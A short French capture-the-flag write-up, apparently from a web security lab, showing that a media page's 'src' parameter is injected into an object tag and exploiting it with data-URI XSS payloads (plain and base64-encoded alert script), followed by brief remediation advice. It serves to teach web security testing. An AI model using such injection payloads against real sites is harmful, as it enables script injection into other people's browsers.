
/index.php?page=media&src=nsa

le parametre src est injectable:

si l'image existe, il va chercher l'image dans: `http://172.16.42.21/images/[src].jpg`

```
<object data="http://172.16.42.21/images/nsa_prism.jpg"></object>
```

si il n'existe pas il va la mettre dans une balise object.

index.php?page=media&src=lol

```
<object data="lol"></object>
```
Nous pouvons donc injecter du code js.

index.php?page=media&src=data:text/html,<script>alert(5)</script>

fonctionne mais ne donne pas de flag, essayons en base64

index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCg1KTwvc2NyaXB0Pg==


Amelioration:

Ne pas parse du base64 directement depuis le query parameters.
Verifier la source et autoriser uniquement les images qui proviennes du site.